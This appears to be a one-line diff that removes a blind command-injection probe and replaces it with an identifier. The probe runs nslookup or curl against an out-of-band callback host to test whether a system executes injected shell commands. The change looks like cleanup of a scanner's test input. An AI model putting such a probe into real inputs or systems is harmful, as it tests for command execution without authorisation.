@@ -1,1 +1,1 @@
-(nslookup -q=cname hitzzmztmfpsxcfec5.bxss.me||curl hitzzmztmfpsxcfec5.bxss.me))
+MO_234187151804_000
